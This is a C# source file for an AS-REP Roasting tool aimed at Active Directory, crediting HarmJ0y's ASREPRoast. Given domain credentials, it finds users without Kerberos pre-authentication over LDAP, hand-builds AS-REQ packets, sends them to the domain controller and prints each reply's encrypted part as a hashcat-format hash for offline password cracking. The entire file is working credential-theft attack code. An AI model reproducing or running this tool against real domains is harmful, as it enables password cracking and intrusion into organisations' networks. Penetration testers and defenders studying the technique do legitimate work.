using System;
using System.DirectoryServices;
using System.Net;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Net.Sockets;
using Org.BouncyCastle.Asn1;

namespace ASREP_Roasting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Arguments parsedArgs = Arguments.ParseArguments(args);

            NetworkCredential cred = new NetworkCredential(parsedArgs.UserName, parsedArgs.Password, parsedArgs.Domain);
            CheckCreds(cred, parsedArgs.DCIP);

            SearchResultCollection users = GetASREPRoastableUsers(cred, parsedArgs.DCIP, parsedArgs.Domain);
            if (users.Count == 0)
            {
                Console.WriteLine("[-] Could not find any AS-REP Roastable Users!");
                return;
            }

            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Ttl = 128; // Windows default
            socket.Connect(parsedArgs.DCIP, 88);

            foreach (SearchResult user in users)
            {
                Console.WriteLine("\n[!] AS-REP Roastable User Found:");
                string samAccountName = user.Properties["samAccountName"][0].ToString();
                string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                string userAccountControl = user.Properties["userAccountControl"][0].ToString();
                Console.WriteLine("[*] SamAccountName     : {0}", samAccountName);
                Console.WriteLine("[*] DistinguishedName  : {0}", distinguishedName);
                Console.WriteLine("[*] UserAccountControl : {0}", userAccountControl);

                string asrepHash = ASREPRoast(samAccountName, parsedArgs.Domain, socket);
                Console.WriteLine("$krb5asrep$23${0}@{1}:{2}", samAccountName, parsedArgs.Domain, asrepHash);
            }

            socket.Close();
        }

        private static string ASREPRoast(string userName, string domain, Socket socket)
        {
            // create and send AS-REQ
            ASREQ asreq = new ASREQ(userName, domain);
            Console.WriteLine("Sending AS-REQ for {0}", userName);
            socket.Send(asreq.RawBytes);

            // Retrieve AS-REP
            byte[] responseBuffer = new byte[2048];
            int readBytes = socket.Receive(responseBuffer);

            // Bring the hash into hashcat format
            string asrepHash = BitConverter.ToString(responseBuffer.Take(readBytes).ToArray()).Replace("-", "").ToUpper();
            asrepHash = asrepHash.Substring(asrepHash.IndexOf("a281fd0481fa".ToUpper()) + 12).Insert(32, "$"); // 'a281fd0481fa' is the byte sequence right before the cipher field of enc-part (the hash we want)
            return asrepHash;
        }

        private static SearchResultCollection GetASREPRoastableUsers(NetworkCredential cred, string dcip, string domain)
        {
            DirectoryEntry directoryEntry = new DirectoryEntry();
            directoryEntry.Path = string.Format("LDAP://{0}/CN=Users{1}", dcip, DomainToLdapString(domain));
            directoryEntry.Username = cred.UserName;
            directoryEntry.Password = cred.Password;

            DirectorySearcher asrepSearcher = new DirectorySearcher(directoryEntry);

            // Return only user accounts that have the 23rd bit in the UAC value set to true (the "Do not require Pre-Auth" btit)
            asrepSearcher.Filter = "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
            SearchResultCollection users = asrepSearcher.FindAll();

            return users;
        }

        private static void CheckCreds(NetworkCredential cred, string dcip)
        {
            try
            {
                PrincipalContext principalContext = new PrincipalContext(ContextType.Domain, dcip);
                if (!principalContext.ValidateCredentials(cred.UserName, cred.Password))
                {
                    Console.WriteLine("[-] Invalid credentials!");
                    Environment.Exit(1);
                }
            }
            catch (PrincipalServerDownException ex)
            {
                Console.WriteLine("[-] Could not connect to {0}", dcip);
                Environment.Exit(1);
            }

            Console.WriteLine("[+] Credentials valid!");
        }

        private static string DomainToLdapString(string domain)
        {
            string[] parts = domain.Split('.');
            string ldapString = "";

            foreach (string part in parts)
            {
                ldapString += ",";
                ldapString += "DC=" + part;
            }

            return ldapString;
        }

    }

    internal class Arguments
    {
        public string Domain { get; private set; }
        public string UserName { get; private set; }
        public string Password { get; private set; }
        public string DCIP { get; set; }

        public Arguments(string domain, string username, string password, string dcip = "")
        {
            Domain = domain;
            UserName = username;
            Password = password;
            DCIP = dcip;
        }

        public static Arguments ParseArguments(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[*] Usage: fqdn\\user password [dc-ip]");
                Environment.Exit(1);
            }

            string[] identity = args[0].Split('\\');
            string domain = identity[0];
            string username = identity[1];
            string password = args[1];
            string dcip = "";
            if (args.Length == 3)
            {
                dcip = args[2];
            }
            else
            {
                try
                {
                    // If no DC IP is supplied, try to resolve the DNS name to retrieve a usbale IPv4 address
                    dcip = Dns.GetHostAddresses(domain).First(i => i.AddressFamily == AddressFamily.InterNetwork).ToString();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Could not resolve domain {0}!", domain);
                    Environment.Exit(1);
                }
            }

            return new Arguments(domain, username, password, dcip);
        }
    }

    internal class ASREQ
    {
        public byte[] RawBytes { get; private set; }

        public ASREQ(string userName, string domain)
        {
            // https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1 - Credit

            //-----
            // AS-REQ Header
            //-----
            var pvno = new DerTaggedObject(1, new DerInteger(5)); // kerberos version
            var msgtype = new DerTaggedObject(2, new DerInteger(10)); // as-req message type


            //-----
            // padata Section (pa = "pre auth")
            //----- 
            var padataType = new DerTaggedObject(1, new DerInteger(128)); // 128 = kRB5-PADATA-PA-PAC-REQUEST - Would normally be kRB5-PADATA-ENC-TIMESTAMP with the encrypted timestamp value if pre-auth is required (Value 2) !! thats the actual "roast" part?
            var padataValue = new DerTaggedObject(2, new DerOctetString(new byte[] { 0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01 })); // bytes are basically just and DER encoded boolean (last byte is the bool value) include PAC: true
            var padata = new DerTaggedObject(3, new DerSequence(new DerSequence(padataType, padataValue)));


            //-----
            // req-body section
            //-----
            var kdcOption = new DerTaggedObject(0, new DerBitString(new byte[] { 0x40, 0x80, 0x00, 0x10 })); // forwardable, renewable, renewable-ok

            var cnameType = new DerTaggedObject(0, new DerInteger(1)); // 1 = kRB5-NT-PRINCIPAL
            var cnameString = new DerTaggedObject(1, new DerSequence(new DerGeneralString(userName)));
            var cname = new DerTaggedObject(1, new DerSequence(cnameType, cnameString));

            var realm = new DerTaggedObject(2, new DerGeneralString(domain));

            var snameType = new DerTaggedObject(0, new DerInteger(2)); // 2 = kRBT5-NT-SRV-INST
            var snameStringSequence = new DerTaggedObject(1, new DerSequence(new DerGeneralString("krbtgt"), new DerGeneralString(domain)));
            var sname = new DerTaggedObject(3, new DerSequence(snameType, snameStringSequence));

            var till = new DerTaggedObject(5, new DerGeneralizedTime("20370913024805Z")); // 2037-09-13 02:48:05 UTC - Kekeo Default

            var nonce = new DerTaggedObject(7, new DerInteger(1337)); // can be anything

            var etype = new DerTaggedObject(8, new DerSequence(new DerInteger(23))); // 23 = eTYPE-ARCFOUR-HMAC-MD5

            var reqbody = new DerTaggedObject(4, new DerSequence(kdcOption, cname, realm, sname, till, nonce, etype));

            //----
            // building the as-req packet and prepending the total length in bytes (need to reverse the length bytes to match the padding)
            //----
            var asreqSequence = new DerSequence(pvno, msgtype, padata, reqbody);
            var asreq = new DerTaggedObject(true, Asn1Tags.Application, 10, asreqSequence); // preprends the asreqSequence with the required bytes to be recognized as an AS-REQ request

            byte[] asreqBytes = asreq.GetDerEncoded();
            byte[] packetSizeBytes = BitConverter.GetBytes(asreqBytes.Length);
            Array.Reverse(packetSizeBytes); // reverse byte order of the packet size, so that it can be safely prepended (0x16000000 -> 0x00000016)

            // preprend the size of the asreq packet
            RawBytes = new byte[packetSizeBytes.Length + asreqBytes.Length];
            packetSizeBytes.CopyTo(RawBytes, 0);
            asreqBytes.CopyTo(RawBytes, packetSizeBytes.Length);
        }
    }
}
